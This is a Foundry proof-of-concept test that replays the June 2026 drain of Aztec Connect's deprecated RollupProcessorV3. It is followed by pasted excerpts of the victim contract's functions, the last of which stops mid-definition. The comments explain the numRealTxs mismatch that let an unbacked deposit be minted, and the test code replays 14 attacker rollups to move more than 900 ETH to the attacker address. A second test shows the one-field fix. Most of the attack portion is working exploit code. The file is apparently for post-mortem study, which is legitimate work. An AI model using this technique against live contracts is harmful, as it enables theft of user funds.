// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

// @KeyInfo - Total Lost : ~$2.19M (908.99 ETH + 270.5K DAI + 167.9 wstETH + yvDAI/yvWETH/LUSD/yvLUSD)
//                          This PoC covers the 908.99 ETH leg.
// Attacker EOA          : 0x0F18D8b44a740272f0be4d08338d2b165b7EdD17 (funded via Tornado Cash)
// Attacker Orchestrator : 0x06f585F74e0DA633Ae813A0f23Fb9900B61d0fcD (4-byte trigger 0x6f3ce701)
// Vulnerable contract   : 0xFF1F2B4ADb9dF6FC8eAFecDcbF96A2B351680455 (Aztec Connect RollupProcessorV3, deprecated)
// Attack Tx             : 0x074ec9317d8336db37e8c348fbdd7515573ff4088239c77ab429f522509aeeb1 (block 25,315,715)
//
// @Analysis
// Attack date : Jun-14-2026
// Chain       : Ethereum mainnet
// Post-mortem : https://www.cryptotimes.io/2026/06/15/aztec-exploit-drains-2-19m-from-dormant-privacy-protocol/
// Foundation  : https://x.com/aztecFND/status/2066175938887619055
//
// @Root cause - numRealTxs mismatch between proof/hash coverage and L1 settlement (core/Decoder.sol):
//
//   * decodeProof() commits the public inputs in FULL inner-rollup chunks. With numRealTxs = 1,
//     rollupSize = 1024 and numRollupTxs = 32 (innerSize = 1024/32 = 32), it hashes ceil(1/32) = 1
//     full chunk -> ALL 32 slots of inner-rollup #0 are proven and their notes minted into L2 state.
//
//   * processDepositsAndWithdrawals() settles EXACTLY numRealTxs txs:  end = ptr + numRealTxs * 256.
//     With numRealTxs = 1 only slot 0 is settled.
//
//   => A DEPOSIT placed in slot 1 is proven (note minted) but its L1 validation
//      (decreasePendingDepositBalance + shield signature) is SKIPPED -> unbacked L2 balance,
//      later withdrawn for real ETH. The proof is a normal, valid rollup proof; nothing is forged.
//      On the deprecated RollupProcessorV3, processRollup() is permissionless (the provider gate was
//      removed for sunset self-exit), so anyone can submit these rollups.
//
//   numRealTxs lives at proofData[0x11c0], OUTSIDE the 0..0x11c0 header that is hashed, so it is NOT
//   bound by the zk proof. It only sets the chunk COUNT ceil(numRealTxs/32), and 1..32 all map to one
//   chunk -> the SAME proof verifies for any numRealTxs in [1..32].
//
// @Choreography - 14 state-chained rollups (ids 13277..13290). The ETH leg:
//      13277        : [slot0 account (settled no-op)] [slot1 DEPOSIT 908.99 ETH (skipped -> unbacked mint)]
//      13278..13283 : same trick for DAI / wstETH / yvDAI / yvWETH / LUSD / yvLUSD
//      13284..13289 : withdraw those 6 assets (settled) to the attacker EOA
//      13290        : [slot0 WITHDRAW 908.99 ETH (settled) -> attacker EOA]
//
// Requires an archival mainnet RPC (state at block 25,300,000) for the `mainnet` endpoint.

contract AztecConnect_exp is Test {
    address internal constant ROLLUP = 0xFF1F2B4ADb9dF6FC8eAFecDcbF96A2B351680455;
    address internal constant ATTACKER = 0x0F18D8b44a740272f0be4d08338d2b165b7EdD17;
    string internal constant CALLDATA = "src/test/2026-06/aztecconnect_calldata.txt";
    uint256 internal constant N = 14;

    // `proofData` starts 100 bytes into processRollup(bytes,bytes) calldata; field offsets within it:
    uint256 internal constant OFF_ROLLUP_ID = 0x00; // rollupId          (uint256)
    uint256 internal constant OFF_NUM_REAL = 0x11c0; // numRealTxs        (uint32) <- the unprotected knob
    uint256 internal constant OFF_PUBLIC_VALUE = 4810; // slot-1 tx publicValue (encStart 4552 + account 129 + 129)

    function setUp() public {
        vm.createSelectFork("mainnet", 25_300_000);
    }

    /// @notice 14 state-chained rollups drain the vault; each declares numRealTxs == 1.
    function testExploit() public {
        emit log_named_decimal_uint("vault ETH before    ", ROLLUP.balance, 18);

        uint256 start = ATTACKER.balance;
        for (uint256 i = 0; i < N; i++) {
            bytes memory cd = vm.parseBytes(vm.readLine(CALLDATA));
            emit log_named_uint(
                string.concat("rollup ", vm.toString(_word(cd, OFF_ROLLUP_ID)), " numRealTxs"), _numRealTxs(cd)
            );
            // processRollup is permissionless on V3, so any caller is accepted.
            (bool ok,) = ROLLUP.call(cd);
            require(ok, "processRollup replay failed");
        }
        vm.closeFile(CALLDATA);

        uint256 gained = ATTACKER.balance - start;
        emit log_named_decimal_uint("attacker ETH gained ", gained, 18);
        emit log_named_decimal_uint("vault ETH after     ", ROLLUP.balance, 18);
        assertGt(gained, 900 ether, "expected >900 ETH drained to attacker");
    }

    /// @notice The vulnerability isolated to a single field. The mint rollup (13277) carries a real
    ///         908.99-ETH deposit in slot 1 but declares numRealTxs = 1 so settlement skips it. Restore
    ///         the honest count (numRealTxs = 2) WITHOUT touching anything else: the identical proof
    ///         still verifies (1..32 -> same hash chunk), but now the deposit is settled and its L1
    ///         backing check rejects it. One byte is the difference between a free mint and a revert.
    function testBugIsOneField() public {
        bytes memory cd = vm.parseBytes(vm.readLine(CALLDATA)); // rollup 13277 (the ETH mint)
        vm.closeFile(CALLDATA);

        emit log_named_uint("declared numRealTxs   ", _numRealTxs(cd));
        emit log_named_decimal_uint("slot-1 DEPOSIT value ", _word(cd, OFF_PUBLIC_VALUE), 18);

        // Flip ONLY numRealTxs 1 -> 2 (its honest value: this rollup really has 2 txs).
        _setNumRealTxs(cd, 2);
        assertEq(_numRealTxs(cd), 2, "knob set to honest count");

        (bool ok, bytes memory ret) = ROLLUP.call(cd);
        assertFalse(ok, "same proof + honest numRealTxs => deposit validated => revert");
        emit log_named_bytes("revert selector (deposit validation)", ret); // INSUFFICIENT_DEPOSIT()
    }

    /* ----------------------------- calldata helpers ----------------------------- */

    function _word(bytes memory cd, uint256 pdOff) internal pure returns (uint256 v) {
        assembly {
            v := mload(add(cd, add(0x20, add(100, pdOff))))
        }
    }

    function _numRealTxs(bytes memory cd) internal pure returns (uint256 v) {
        // numRealTxs occupies the top 4 bytes of the 32-byte word at proofData[0x11c0].
        assembly {
            v := shr(224, mload(add(cd, add(0x20, add(100, 0x11c0)))))
        }
    }

    function _setNumRealTxs(bytes memory cd, uint32 n) internal pure {
        assembly {
            let p := add(cd, add(0x20, add(100, 0x11c0)))
            let w := and(mload(p), 0x00000000ffffffffffffffffffffffffffffffffffffffffffffffffffffffff)
            mstore(p, or(w, shl(224, n)))
        }
    }
}

funcs:
function processAsyncDefiInteraction(uint256 _interactionNonce)
        external
        override(IRollupProcessor)
        whenNotPaused
        noReenterButAsync
        returns (bool)
    {
        uint256 encodedBridgeCallData;
        uint256 totalInputValue;
        assembly {
            mstore(0x00, _interactionNonce)
            mstore(0x20, pendingDefiInteractions.slot)
            let interactionPtr := keccak256(0x00, 0x40)

            encodedBridgeCallData := sload(interactionPtr)
            totalInputValue := sload(add(interactionPtr, 0x01))
        }
        if (encodedBridgeCallData == 0) {
            revert INVALID_BRIDGE_CALL_DATA();
        }
        FullBridgeCallData memory fullBridgeCallData = getFullBridgeCallData(encodedBridgeCallData);

        (
            AztecTypes.AztecAsset memory inputAssetA,
            AztecTypes.AztecAsset memory inputAssetB,
            AztecTypes.AztecAsset memory outputAssetA,
            AztecTypes.AztecAsset memory outputAssetB
        ) = getAztecAssetTypes(fullBridgeCallData, _interactionNonce);


        IDefiBridge bridgeContract;
        assembly {
            mstore(0x00, supportedBridges.slot)
            let bridgeSlot := keccak256(0x00, 0x20)

            bridgeContract := and(encodedBridgeCallData, 0xffffffff)
            bridgeContract := sload(add(bridgeSlot, sub(bridgeContract, 0x01)))
            bridgeContract := and(bridgeContract, ADDRESS_MASK)
        }
        if (address(bridgeContract) == address(0)) {
            revert INVALID_BRIDGE_ADDRESS();
        }




        pendingDefiInteractions[_interactionNonce].encodedBridgeCallData = 0;


        InteractionInputs memory inputs =
            InteractionInputs(totalInputValue, _interactionNonce, uint64(fullBridgeCallData.auxData));
        (uint256 outputValueA, uint256 outputValueB, bool interactionCompleted) = bridgeContract.finalise(
            inputAssetA, inputAssetB, outputAssetA, outputAssetB, inputs.interactionNonce, inputs.auxData
        );

        if (!interactionCompleted) {
            pendingDefiInteractions[inputs.interactionNonce].encodedBridgeCallData = encodedBridgeCallData;
            return false;
        }

        if (outputValueB > 0 && outputAssetB.assetType == AztecTypes.AztecAssetType.NOT_USED) {
            revert NONZERO_OUTPUT_VALUE_ON_NOT_USED_ASSET(outputValueB);
        }

        if (outputValueA == 0 && outputValueB == 0) {

            transferTokensAsync(address(bridgeContract), inputAssetA, inputs.totalInputValue, inputs.interactionNonce);
            transferTokensAsync(address(bridgeContract), inputAssetB, inputs.totalInputValue, inputs.interactionNonce);
        } else {

            transferTokensAsync(address(bridgeContract), outputAssetA, outputValueA, inputs.interactionNonce);
            transferTokensAsync(address(bridgeContract), outputAssetB, outputValueB, inputs.interactionNonce);
        }

function processRollup(bytes calldata,  bytes calldata _signatures)
        external
        override(IRollupProcessor)
        whenNotPaused
        allowAsyncReenter
    {
        (bytes memory proofData, uint256 numTxs, uint256 publicInputsHash) = decodeProof();
        address rollupBeneficiary = extractRollupBeneficiary(proofData);

        processRollupProof(proofData, _signatures, numTxs, publicInputsHash, rollupBeneficiary);

        transferFee(proofData, rollupBeneficiary);
    }

function depositPendingFunds(uint256 _assetId, uint256 _amount, address _owner, bytes32 _proofHash)
        external
        payable
        override(IRollupProcessor)
        whenNotPaused
        noReenter
    {

        if (_assetId == ETH_ASSET_ID && msg.value != _amount) {
            revert MSG_VALUE_WRONG_AMOUNT();
        }
        if (_assetId != ETH_ASSET_ID && msg.value != 0) {
            revert DEPOSIT_TOKENS_WRONG_PAYMENT_TYPE();
        }

        increasePendingDepositBalance(_assetId, _owner, _amount);

        if (_proofHash != 0) approveProof(_proofHash);

        emit Deposit(_assetId, _owner, _amount);

        if (_assetId != ETH_ASSET_ID) {
            address assetAddress = getSupportedAsset(_assetId);

            if (IERC20(assetAddress).allowance(msg.sender, address(this)) < _amount) {
                revert INSUFFICIENT_TOKEN_APPROVAL();
            }
            TokenTransfers.safeTransferFrom(assetAddress, msg.sender, address(this), _amount);
        }
    }

function receiveEthFromBridge(uint256 _interactionNonce) external payable override(IRollupProcessor) {
        assembly {

            mstore(0x00, _interactionNonce)
            mstore(0x20, ethPayments.slot)
            let slot := keccak256(0x00, 0x40)

            sstore(slot, add(sload(slot), callvalue()))
        }
    }

function approveProof(bytes32 _proofHash) public override(IRollupProcessor) whenNotPaused {

        assembly {

            mstore(0x00, caller())
            mstore(0x20, depositProofApprovals.slot)
            mstore(0x20, keccak256(0x00, 0x40))
            mstore(0x00, _proofHash)
            sstore(keccak256(0x00, 0x40), 1)
        }
    }

function initialize() external reinitializer(getImplementationVersion()) {
        rollupState.capped = true;
        lastRollupTimeStamp = uint32(block.timestamp);
    }

function setSupportedAsset(address _token, uint256 _gasLimit)
        external
        override(IRollupProcessor)
        whenNotPaused
        checkThirdPartyContractStatus
        noReenter
    {
        if (_token.code.length == 0) {
            revert INVALID_ADDRESS_NO_CODE();
        }
        if (_gasLimit < MIN_ERC20_GAS_LIMIT || _gasLimit > MAX_ERC20_GAS_LIMIT) {
            revert INVALID_ASSET_GAS();
        }

        supportedAssets.push(_token);
        uint256 assetId = supportedAssets.length;
        assetGasLimits[assetId] = _gasLimit;
        emit AssetAdded(assetId, _token, assetGasLimits[assetId]);
    }

function renounceRole(bytes32 role, address account) public virtual override {
        require(account == _msgSender(), "AccessControl: can only renounce roles for self");

        _revokeRole(role, account);
    }

function setSupportedBridge(address _bridge, uint256 _gasLimit)
        external
        override(IRollupProcessor)
        whenNotPaused
        checkThirdPartyContractStatus
        noReenter
    {
        if (_bridge.code.length == 0) {
            revert INVALID_ADDRESS_NO_CODE();
        }
        if (_gasLimit < MIN_BRIDGE_GAS_LIMIT || _gasLimit > MAX_BRIDGE_GAS_LIMIT) {
            revert INVALID_BRIDGE_GAS();
        }

        supportedBridges.push(_bridge);
        uint256 bridgeAddressId = supportedBridges.length;
        bridgeGasLimits[bridgeAddressId] = _gasLimit;
        emit BridgeAdded(bridgeAddressId, _bridge, bridgeGasLimits[bridgeAddressId]);
    }

function offchainData(uint256 _rollupId, uint256 _chunk, uint256 _totalChunks, bytes calldata  )
        external
        override(IRollupProcessor)
        whenNotPaused
    {
        emit OffchainData(_rollupId, _chunk, _totalChunks, msg.sender);
    }

function grantRole(bytes32 role, address account) public virtual override onlyRole(getRoleAdmin(role)) {
        _grantRole(role, account);
    }

function revokeRole(bytes32 role, address account) public virtual override onlyRole(getRoleAdmin(role)) {
        _revokeRole(role, account);
    }

function transferFee(bytes memory _proofData, address _feeReceiver) internal {
        for (uint256 i = 0; i < NUMBER_OF_ASSETS;) {
            uint256 txFee = extractTotalTxFee(_proofData, i);
            if (txFee > 0) {
                uint256 assetId = extractFeeAssetId(_proofData, i);
                if (assetId == ETH_ASSET_ID) {





                    assembly {
                        pop(call(50000, _feeReceiver, txFee, 0, 0, 0, 0))
                    }
                } else {
                    address assetAddress = getSupportedAsset(assetId);
                    TokenTransfers.transferToDoNotBubbleErrors(
                        assetAddress, _feeReceiver, txFee, assetGasLimits[assetId]
                    );
                }
            }
            unchecked {
                ++i;
            }
        }
    }

function increasePendingDepositBalance(uint256 _assetId, address _owner, uint256 _amount)
        internal
        validateAssetIdIsNotVirtual(_assetId)
    {
        uint256 pending = userPendingDeposits[_assetId][_owner];

        if (rollupState.capped) {
            AssetCap memory cap = caps[_assetId];
            uint256 precision = 10 ** cap.precision;

            if (cap.pendingCap == 0 || pending + _amount > uint256(cap.pendingCap) * precision) {
                revert PENDING_CAP_SURPASSED();
            }

            if (cap.dailyCap == 0) {
                revert DAILY_CAP_SURPASSED();
            } else {

                uint256 capVal = uint256(cap.dailyCap) * precision;
                uint256 rate = capVal / 1 days;
                cap.available += (rate * (block.timestamp - cap.lastUpdatedTimestamp)).toU128();
                if (cap.available > capVal) {
                    cap.available = capVal.toU128();
                }
                if (_amount > cap.available) {
                    revert DAILY_CAP_SURPASSED();
                }

                cap.available -= _amount.toU128();
                cap.lastUpdatedTimestamp = uint32(block.timestamp);
                caps[_assetId] = cap;
            }
        }

        userPendingDeposits[_assetId][_owner] = pending + _amount;
    }

function getFullBridgeCallData(uint256 _encodedBridgeCallData)
        internal
        view
